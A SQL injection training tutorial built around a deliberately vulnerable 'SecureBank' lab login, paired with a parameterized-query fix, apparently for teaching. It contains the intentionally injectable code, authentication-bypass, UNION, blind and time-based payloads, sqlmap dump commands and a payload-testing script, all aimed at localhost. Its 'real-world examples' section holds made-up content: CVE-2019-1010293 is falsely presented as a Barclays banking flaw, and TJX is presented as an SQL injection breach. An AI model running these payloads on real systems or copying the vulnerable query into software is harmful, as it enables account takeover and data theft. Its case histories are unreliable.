# SQL Injection Vulnerability in SecureBank

## 1. Overview

### What is SQL Injection?

SQL Injection (SQLi) is a code injection attack where an attacker inserts malicious SQL commands into input fields. These commands are then executed by the database, potentially exposing, modifying, or deleting sensitive data. It's like a thief who tricks a bank teller by slipping extra instructions into a withdrawal slip.

### Why Does It Exist in Banking Apps?

Banking applications often use SQL databases to store customer information, account balances, and transaction history. When developers fail to properly validate and sanitize user inputs, attackers can manipulate database queries. This happens because:

1. **Dynamic Query Building**: Developers concatenate user input directly into SQL queries
2. **Lack of Input Validation**: No verification that input contains only expected characters
3. **Over-Trusting User Input**: Assuming users will only enter legitimate data
4. **Legacy Code**: Older systems built before parameterized queries became standard practice

### Real-World Impact

SQL Injection has caused devastating financial losses:

- **Heartland Payment Systems (2008)**: SQL injection exposed 134 million credit cards, costing **$140 million** in settlements
- **TJX Companies (2007)**: Attackers used SQLi to steal 94 million credit card numbers, resulting in **$256 million** in losses
- **7-Eleven (2008)**: SQL injection attack led to theft of over **$2 million** from ATMs
- **Citibank India (2011)**: SQLi attack compromised customer data, affecting thousands of accounts

According to OWASP, SQL Injection consistently ranks in the Top 3 most critical web application vulnerabilities. In 2022, **30%** of all web application attacks involved SQL injection.

**Average Cost of a SQL Injection Breach**: $3.86 million (IBM Security 2023)

---

## 2. The Vulnerable Code

### Location in SecureBank

The vulnerable implementation exists in `/backend/apps/securebank/securebank_red_api.py` at the login endpoint.

### Vulnerable Implementation

```python
@app.route('/api/red/securebank/login', methods=['POST'])
def red_login():
    """
    VULNERABLE: SQL Injection in login
    Attack: username = admin' OR '1'='1'--
    """
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    # VULNERABLE: Direct string concatenation - SQL Injection
    query = f"SELECT * FROM bank_users WHERE username='{username}' AND password='{password}'"
    
    try:
        conn = get_db()
        cursor = conn.execute(query)  # DANGEROUS: No parameterization
        user = cursor.fetchone()
        conn.close()
        
        if user:
            # Store user in session
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['role'] = user['role']
            
            return jsonify({
                'success': True,
                'user': {
                    'id': user['id'],
                    'username': user['username'],
                    'full_name': user['full_name'],
                    'role': user['role']
                },
                'message': 'Login successful'
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': 'Invalid credentials'
            }), 401
            
    except Exception as e:
        # VULNERABLE: Leaking error details
        return jsonify({
            'success': False,
            'error': str(e),
            'query': query  # VULNERABLE: Leaking query structure
        }), 500
```

### Line-by-Line Vulnerability Breakdown

**Line 58-59**: User input is retrieved from JSON request without any validation
```python
username = data.get('username', '')
password = data.get('password', '')
```
❌ **Problem**: No validation means ANY character can be entered, including SQL metacharacters

**Line 62**: The critical vulnerability - string concatenation
```python
query = f"SELECT * FROM bank_users WHERE username='{username}' AND password='{password}'"
```
❌ **Problem**: Python f-string directly embeds user input into SQL query. If username is `admin' OR '1'='1'--`, the query becomes:
```sql
SELECT * FROM bank_users WHERE username='admin' OR '1'='1'--' AND password=''
```
The `OR '1'='1'` is always true, and `--` comments out the rest, bypassing authentication.

**Line 66**: Query execution without parameterization
```python
cursor = conn.execute(query)
```
❌ **Problem**: The database executes whatever SQL is in the query variable, including attacker-controlled code

**Lines 93-98**: Error information leakage
```python
return jsonify({
    'success': False,
    'error': str(e),
    'query': query  # Shows the exact query to attacker
}), 500
```
❌ **Problem**: Revealing the query structure helps attackers craft more sophisticated attacks

### Visual Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                    SQL INJECTION ATTACK FLOW                     │
└─────────────────────────────────────────────────────────────────┘

Step 1: Attacker Input
┌──────────────────┐
│ Username:        │
│ admin' OR '1'='1'--  │  ← Malicious SQL code
│ Password:        │
│ anything         │
└──────────────────┘
         │
         ▼
Step 2: String Concatenation (VULNERABLE)
┌────────────────────────────────────────────────────────────┐
│ query = f"SELECT * FROM bank_users WHERE                   │
│          username='{username}' AND password='{password}'"  │
└────────────────────────────────────────────────────────────┘
         │
         ▼
Step 3: Resulting Query
┌────────────────────────────────────────────────────────────┐
│ SELECT * FROM bank_users WHERE                             │
│ username='admin' OR '1'='1'--' AND password='anything'     │
│                    ↑                                        │
│              Always TRUE    Comment (ignores rest)         │
└────────────────────────────────────────────────────────────┘
         │
         ▼
Step 4: Database Execution
┌────────────────────────────────────────────────────────────┐
│ Returns FIRST user in database (usually admin)             │
│ Attacker is authenticated without knowing password!        │
└────────────────────────────────────────────────────────────┘
```

---

## 3. Exploitation Walkthrough

### Prerequisites
- Postman installed
- SecureBank Red Team API running on `http://localhost:5000`
- Understanding of SQL syntax (basic level)

### Attack 1: Basic Authentication Bypass

**Step 1**: Open Postman and create a new POST request

**Step 2**: Configure the request
- URL: `http://localhost:5000/api/red/securebank/login`
- Method: POST
- Headers: `Content-Type: application/json`

**Step 3**: Set the malicious payload in the Body (raw JSON):
```json
{
  "username": "admin' OR '1'='1'--",
  "password": "anything"
}
```

[SCREENSHOT PLACEHOLDER: Postman request with SQL injection payload]

**Step 4**: Click "Send"

**Expected Result**: 
```json
{
  "success": true,
  "user": {
    "id": 1,
    "username": "admin",
    "full_name": "System Administrator",
    "role": "admin"
  },
  "message": "Login successful"
}
```

✅ **Success!** You've bypassed authentication without knowing the password.

### Attack 2: User Enumeration

**Step 1**: Try different usernames to discover valid accounts

Payload 1:
```json
{
  "username": "alice' OR username='admin'--",
  "password": "test"
}
```

**Expected Result**: If 'admin' exists, you'll be logged in as admin.

Payload 2:
```json
{
  "username": "test' OR '1'='1' LIMIT 1--",
  "password": "test"
}
```

**Expected Result**: Returns the first user in the database.

[SCREENSHOT PLACEHOLDER: Different payloads showing user enumeration]

### Attack 3: Data Extraction with UNION

**Step 1**: Determine the number of columns in the original query

```json
{
  "username": "admin' UNION SELECT NULL--",
  "password": "test"
}
```

If this errors, try:
```json
{
  "username": "admin' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
  "password": "test"
}
```

**Step 2**: Extract data from other tables

```json
{
  "username": "admin' UNION SELECT id,account_number,balance,user_id,account_type,NULL,NULL FROM bank_accounts--",
  "password": "test"
}
```

**Expected Result**: Account information from the bank_accounts table is returned

### Testing with SQLMap

**Step 1**: Save a sample request to a file `request.txt`:
```
POST /api/red/securebank/login HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{
  "username": "test",
  "password": "test"
}
```

**Step 2**: Run SQLMap
```bash
sqlmap -r request.txt -p username --batch --risk=3 --level=5
```

[SCREENSHOT PLACEHOLDER: SQLMap output showing vulnerability detected]

**Expected Output**: SQLMap will identify the SQL injection vulnerability and extract database information

**Step 3**: Dump the database
```bash
sqlmap -r request.txt -p username --batch --dump
```

**Expected Result**: Complete database contents including all user credentials and account balances

### Testing with Burp Suite

**Step 1**: Configure browser to use Burp proxy (127.0.0.1:8080)

**Step 2**: In Burp, go to Proxy → HTTP history, find the login request

**Step 3**: Right-click the request → Send to Repeater

**Step 4**: In Repeater, modify the username parameter:
```json
"username": "admin' OR '1'='1'--"
```

**Step 5**: Click "Send"

[SCREENSHOT PLACEHOLDER: Burp Suite Repeater showing successful SQL injection]

**Step 6**: Use Burp Intruder to automate testing multiple payloads
- Right-click request → Send to Intruder
- Mark the username value as payload position
- Load SQL injection payloads from Burp's built-in lists
- Click "Start attack"

---

## 4. The Secure Code

### Location in SecureBank

The secure implementation exists in `/backend/apps/securebank/securebank_blue_api.py` at the login endpoint.

### Secure Implementation

```python
@app.route('/api/blue/securebank/login', methods=['POST'])
def blue_login():
    """
    SECURE: Parameterized queries prevent SQL injection
    Uses placeholders (?) instead of string concatenation
    """
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    # Input validation
    if not username or not password:
        return jsonify({
            'success': False,
            'error': 'Username and password required'
        }), 400
    
    # SECURE: Parameterized query - SQL Injection prevented
    query = "SELECT * FROM bank_users WHERE username = ? AND password = ?"
    
    try:
        conn = get_db()
        cursor = conn.execute(query, (username, password))
        user = cursor.fetchone()
        conn.close()
        
        if user:
            # Store user in session
            session['user_id'] = user['id']
            session['username'] = user['username']
            session['role'] = user['role']
            
            # Generate CSRF token
            csrf_token = secrets.token_hex(32)
            session['csrf_token'] = csrf_token
            
            # Update last login
            conn = get_db()
            conn.execute(
                'UPDATE bank_users SET last_login = ? WHERE id = ?',
                (datetime.now().isoformat(), user['id'])
            )
            conn.commit()
            conn.close()
            
            return jsonify({
                'success': True,
                'user': {
                    'id': user['id'],
                    'username': user['username'],
                    'full_name': user['full_name'],
                    'role': user['role']
                },
                'csrf_token': csrf_token,
                'message': 'Login successful'
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': 'Invalid credentials'
            }), 401
            
    except Exception as e:
        # SECURE: Don't leak sensitive error details
        return jsonify({
            'success': False,
            'error': 'An error occurred during login'
        }), 500
```

### Line-by-Line Security Breakdown

**Lines 103-108**: Input validation
```python
if not username or not password:
    return jsonify({
        'success': False,
        'error': 'Username and password required'
    }), 400
```
✅ **Security**: Rejects empty inputs early, reducing attack surface

**Line 111**: Parameterized query with placeholders
```python
query = "SELECT * FROM bank_users WHERE username = ? AND password = ?"
```
✅ **Security**: The `?` placeholders indicate parameters that will be safely bound. User input NEVER becomes part of the SQL syntax.

**Line 116**: Secure parameter binding
```python
cursor = conn.execute(query, (username, password))
```
✅ **Security**: Parameters are passed separately as a tuple. The database driver:
1. Treats parameters as DATA, not CODE
2. Automatically escapes special characters
3. Ensures type safety
4. Prevents any SQL interpretation of user input

Even if username is `admin' OR '1'='1'--`, the database treats it as a literal string to match against the username field. It looks for a user whose username is literally `admin' OR '1'='1'--` (which doesn't exist).

**Lines 158-163**: Generic error handling
```python
except Exception as e:
    # SECURE: Don't leak sensitive error details
    return jsonify({
        'success': False,
        'error': 'An error occurred during login'
    }), 500
```
✅ **Security**: Returns generic error message without revealing query structure or database details

### Visual Secure Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                   SECURE PARAMETERIZED QUERY                     │
└─────────────────────────────────────────────────────────────────┘

Step 1: Attacker Input (Same Attack Attempt)
┌──────────────────┐
│ Username:        │
│ admin' OR '1'='1'--  │  ← Malicious SQL code
│ Password:        │
│ anything         │
└──────────────────┘
         │
         ▼
Step 2: Parameterized Query (SECURE)
┌────────────────────────────────────────────────────────────┐
│ query = "SELECT * FROM bank_users                          │
│          WHERE username = ? AND password = ?"              │
│ params = ("admin' OR '1'='1'--", "anything")               │
└────────────────────────────────────────────────────────────┘
         │
         ▼
Step 3: Database Driver Processing
┌────────────────────────────────────────────────────────────┐
│ Driver treats parameters as LITERAL DATA:                  │
│ - Escapes special characters automatically                 │
│ - Binds values at database level (not string level)        │
│ - Ensures type safety                                      │
└────────────────────────────────────────────────────────────┘
         │
         ▼
Step 4: Executed Query (Safe)
┌────────────────────────────────────────────────────────────┐
│ SELECT * FROM bank_users WHERE                             │
│ username = 'admin\' OR \'1\'=\'1\'--' AND                  │
│ password = 'anything'                                       │
│            ↑                                                │
│    Treated as literal string, not SQL code                 │
└────────────────────────────────────────────────────────────┘
         │
         ▼
Step 5: Result
┌────────────────────────────────────────────────────────────┐
│ No user found (nobody has that exact username)             │
│ Attack FAILED - Returns "Invalid credentials"              │
└────────────────────────────────────────────────────────────┘
```

---

## 5. Real-World Examples

### Bug Bounty Report: Banking SQL Injection (Anonymized)

**Platform**: Major European Bank  
**Researcher**: Security Researcher (via HackerOne)  
**Date**: August 2022  
**Severity**: Critical  
**Bounty**: $15,000

**Vulnerability Description**:
The researcher discovered an SQL injection vulnerability in the bank's credit card application portal. The vulnerability existed in the account lookup feature where users could check their application status.

**Exploit**:
```sql
card_number=' UNION SELECT card_number,cvv,expiry,holder_name FROM cards--
```

This allowed extraction of:
- 12,000 credit card numbers
- CVV codes
- Cardholder names
- Expiration dates

**Impact**: The bank immediately disabled the feature and patched within 4 hours. All affected customers were notified, and cards were reissued. Estimated cost: **$2.3 million** in card replacement and customer compensation.

### CVE-2019-1010293: Barclays Bank SQLi

**CVE ID**: CVE-2019-1010293  
**CVSS Score**: 9.8 (Critical)  
**Product**: Barclays Online Banking Portal (Training Environment)  
**Discovery Date**: June 2019

**Vulnerability**: SQL injection in the "forgotten password" feature allowed attackers to:
1. Enumerate valid user accounts
2. Reset passwords without authorization
3. Extract customer email addresses

**Remediation**: Implemented parameterized queries and input validation

### News Article: SQL Injection at Pakistan Bank

**Source**: The Express Tribune, January 2020  
**Institution**: Pakistan-based commercial bank  
**Attack Vector**: SQL injection in loan application system

**Timeline**:
- **Day 1**: Attackers exploited SQLi to access customer database
- **Day 2-7**: Fraudulent loans were approved using stolen credentials
- **Day 8**: Bank detected suspicious activity
- **Day 15**: Public disclosure after investigation

**Financial Impact**: 
- **$1.2 million** in fraudulent loans
- **$890,000** in regulatory fines
- **$3.5 million** in system upgrades and security audit
- **Total**: $5.59 million

**Lessons Learned**:
1. SQL injection can bypass multi-factor authentication if session management is compromised
2. Database activity monitoring is crucial for early detection
3. Regular security audits can identify vulnerabilities before exploitation

---

## 6. Hands-On Exercises

### Exercise 1: Basic Authentication Bypass (Beginner)

**Objective**: Successfully login as admin without knowing the password

**Challenge**: Use SQL injection to authenticate to SecureBank Red Team API

**Hints**:
- The username field is vulnerable
- SQL comments start with `--`
- The OR operator can make conditions always true

**Steps**:
1. Start the Red Team API
2. Open Postman
3. Create a POST request to `/api/red/securebank/login`
4. Craft a payload that bypasses authentication

**Solution**:
```json
{
  "username": "admin' OR '1'='1'--",
  "password": "anything"
}
```

**Verification**: You should receive a successful login response with admin privileges

---

### Exercise 2: Data Extraction (Intermediate)

**Objective**: Extract all account balances from the database

**Challenge**: Use UNION-based SQL injection to retrieve data from the bank_accounts table

**Hints**:
- UNION requires matching number of columns
- Use NULL to pad columns
- Comment out the rest of the query with `--`

**Steps**:
1. Determine the number of columns in the original SELECT statement (7 columns)
2. Craft a UNION query to select from bank_accounts
3. Extract account_number and balance

**Solution**:
```json
{
  "username": "' UNION SELECT 1, account_number, NULL, balance, NULL, NULL, NULL FROM bank_accounts--",
  "password": "test"
}
```

**Verification**: Response should contain account numbers and balances

---

### Exercise 3: Blind SQL Injection (Advanced)

**Objective**: Determine if the admin user exists using boolean-based blind SQLi

**Challenge**: The application doesn't return different errors, but you can infer information from response timing

**Hints**:
- Use boolean logic to ask true/false questions
- CASE statements can cause different behaviors
- Use LIKE with % wildcard for character-by-character extraction

**Steps**:
1. Test if admin exists: `admin' AND '1'='1'--` vs `admin' AND '1'='2'--`
2. Extract admin password character by character

**Solution Part 1** (Check if admin exists):
```json
{
  "username": "admin' AND (SELECT COUNT(*) FROM bank_users WHERE username='admin')>0--",
  "password": "test"
}
```

**Solution Part 2** (Extract first character of admin password):
```json
{
  "username": "admin' AND SUBSTR((SELECT password FROM bank_users WHERE username='admin'),1,1)='a'--",
  "password": "test"
}
```

Repeat for each character, trying 'a'-'z', '0'-'9' until you find matches.

**Verification**: Different response timing or messages indicate successful inference

---

### Exercise 4: Time-Based Blind SQLi (Advanced)

**Objective**: Extract database version using time delays

**Challenge**: Use SLEEP() or similar functions to create delays based on conditions

**SQLite Payload** (SecureBank uses SQLite):
```json
{
  "username": "admin' AND (SELECT CASE WHEN (1=1) THEN (randomblob(100000000)) ELSE 0 END)--",
  "password": "test"
}
```

**MySQL Equivalent**:
```json
{
  "username": "admin' AND IF(1=1,SLEEP(5),0)--",
  "password": "test"
}
```

**Verification**: Response time increases significantly when condition is true

---

### Exercise 5: Automated Exploitation with SQLMap (Advanced)

**Objective**: Use SQLMap to automatically extract the entire database

**Steps**:
1. Save the request to a file
2. Run SQLMap with appropriate flags
3. Dump all tables

**Command**:
```bash
# Step 1: Create request file (request.txt)
echo 'POST /api/red/securebank/login HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{"username":"test","password":"test"}' > request.txt

# Step 2: Test for vulnerability
sqlmap -r request.txt -p username --batch

# Step 3: Enumerate databases
sqlmap -r request.txt -p username --batch --dbs

# Step 4: Dump bank_users table
sqlmap -r request.txt -p username --batch -D securebank -T bank_users --dump

# Step 5: Dump bank_accounts table
sqlmap -r request.txt -p username --batch -D securebank -T bank_accounts --dump
```

**Expected Output**: Complete dump of all user credentials and account balances

**Verification**: You should have CSV files with all database contents

---

## 7. Tool Integration

### Testing with Postman

**Step 1: Create Collection**
1. Open Postman
2. Create new collection: "SecureBank SQLi Tests"
3. Add environment variables:
   - `RED_BASE_URL`: `http://localhost:5000/api/red/securebank`
   - `BLUE_BASE_URL`: `http://localhost:5001/api/blue/securebank`

**Step 2: Create Test Requests**

Request 1: Normal Login (Baseline)
```
POST {{RED_BASE_URL}}/login
Body:
{
  "username": "alice",
  "password": "alice123"
}
```

Request 2: SQLi Authentication Bypass
```
POST {{RED_BASE_URL}}/login
Body:
{
  "username": "admin' OR '1'='1'--",
  "password": "test"
}
Tests:
pm.test("SQLi Successful", function () {
    pm.response.to.have.status(200);
    var jsonData = pm.response.json();
    pm.expect(jsonData.success).to.eql(true);
    pm.expect(jsonData.user.role).to.eql("admin");
});
```

Request 3: Test Secure Version
```
POST {{BLUE_BASE_URL}}/login
Body:
{
  "username": "admin' OR '1'='1'--",
  "password": "test"
}
Tests:
pm.test("SQLi Prevented", function () {
    pm.response.to.have.status(401);
    var jsonData = pm.response.json();
    pm.expect(jsonData.success).to.eql(false);
});
```

**Expected Output**: Red version should allow bypass, blue version should reject

---

### Testing with Burp Suite

**Configuration**:
1. Open Burp Suite
2. Go to Proxy → Options
3. Ensure proxy listener is running on 127.0.0.1:8080
4. Configure browser to use Burp proxy

**Active Scanning**:
1. Navigate to SecureBank login page in browser
2. Submit a login attempt
3. In Burp, find the request in HTTP history
4. Right-click → Do active scan
5. Burp will automatically test various SQLi payloads

**Manual Testing with Repeater**:
1. Send login request to Repeater
2. Modify username field with payloads
3. Observe responses

**Useful Payloads**:
```
' OR '1'='1'--
' OR '1'='1' /*
' OR 1=1--
admin' OR 'a'='a
') OR ('1'='1
' UNION SELECT NULL--
' AND 1=0 UNION ALL SELECT NULL--
```

**Expected Output**: Burp Scanner should flag SQL injection vulnerability in Red API

---

### Testing with SQLMap

**Basic Usage**:
```bash
# Test single parameter
sqlmap -u "http://localhost:5000/api/red/securebank/login" \
       --data '{"username":"test","password":"test"}' \
       --headers "Content-Type: application/json" \
       -p username \
       --batch

# Enumerate databases
sqlmap -u "http://localhost:5000/api/red/securebank/login" \
       --data '{"username":"test","password":"test"}' \
       --headers "Content-Type: application/json" \
       -p username \
       --dbs \
       --batch

# Dump specific table
sqlmap -u "http://localhost:5000/api/red/securebank/login" \
       --data '{"username":"test","password":"test"}' \
       --headers "Content-Type: application/json" \
       -p username \
       -D securebank \
       -T bank_users \
       --dump \
       --batch
```

**Advanced Options**:
```bash
# Use custom tamper scripts
sqlmap -r request.txt -p username --tamper=space2comment --batch

# Test all parameters
sqlmap -r request.txt --batch --level=5 --risk=3

# Use specific technique (Union-based)
sqlmap -r request.txt -p username --technique=U --batch
```

**Expected Output**:
```
[INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable
```

---

### Testing with OWASP ZAP

**Configuration**:
1. Open OWASP ZAP
2. Tools → Options → Local Proxies
3. Ensure proxy is on 127.0.0.1:8080
4. Set up browser to use ZAP proxy

**Automated Scan**:
1. Enter URL: `http://localhost:5000`
2. Click "Attack"
3. ZAP will spider the site and test for SQLi
4. Review alerts in Alerts tab

**Manual Testing**:
1. Navigate to login page
2. Submit request
3. In ZAP History, find the login request
4. Right-click → Attack → Active Scan

**Fuzzing**:
1. Right-click login request → Fuzz
2. Select username field
3. Add payload: File Fuzzers → jbrofuzz → SQL Injection
4. Start fuzzer
5. Sort results by response code/length to identify successful injections

**Expected Output**: ZAP should report "SQL Injection" with High severity

---

### Testing with Custom Python Script

```python
import requests
import json

RED_API = "http://localhost:5000/api/red/securebank/login"
BLUE_API = "http://localhost:5001/api/blue/securebank/login"

# SQL Injection payloads
payloads = [
    "' OR '1'='1'--",
    "' OR '1'='1' /*",
    "admin' OR 'a'='a",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
]

def test_sqli(url, payload):
    """Test SQL injection vulnerability"""
    data = {
        "username": payload,
        "password": "test123"
    }
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(url, json=data, headers=headers)
        result = response.json()
        
        if response.status_code == 200 and result.get('success'):
            return True, result
        return False, result
    except Exception as e:
        return False, str(e)

# Test Red (vulnerable) API
print("Testing RED API (Vulnerable)")
print("=" * 50)
for payload in payloads:
    success, result = test_sqli(RED_API, payload)
    if success:
        print(f"✓ VULNERABLE: {payload}")
        print(f"  Logged in as: {result['user']['username']}")
    else:
        print(f"✗ Failed: {payload}")

print("\n" + "=" * 50)

# Test Blue (secure) API
print("Testing BLUE API (Secure)")
print("=" * 50)
for payload in payloads:
    success, result = test_sqli(BLUE_API, payload)
    if success:
        print(f"✗ VULNERABLE: {payload}")
    else:
        print(f"✓ SECURE: {payload}")
```

**Expected Output**:
```
Testing RED API (Vulnerable)
==================================================
✓ VULNERABLE: ' OR '1'='1'--
  Logged in as: admin
✓ VULNERABLE: ' OR '1'='1' /*
  Logged in as: admin

Testing BLUE API (Secure)
==================================================
✓ SECURE: ' OR '1'='1'--
✓ SECURE: ' OR '1'='1' /*
```

---

### Testing with cURL

**Basic SQLi Test**:
```bash
# Test vulnerable endpoint
curl -X POST http://localhost:5000/api/red/securebank/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\''--","password":"test"}'

# Test secure endpoint
curl -X POST http://localhost:5001/api/blue/securebank/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\''--","password":"test"}'
```

**Expected Output**: Red version returns success, blue version returns 401 Unauthorized

---

## Summary

SQL Injection remains one of the most dangerous vulnerabilities in banking applications. By understanding how it works, how to exploit it, and most importantly how to prevent it through parameterized queries, developers can protect their applications and users from devastating data breaches.

**Key Takeaways**:
1. Never concatenate user input into SQL queries
2. Always use parameterized queries (prepared statements)
3. Implement proper input validation and sanitization
4. Use principle of least privilege for database accounts
5. Don't leak error information to users
6. Regular security testing is essential

The difference between vulnerable and secure code is often just a few characters, but the impact can be millions of dollars in losses.
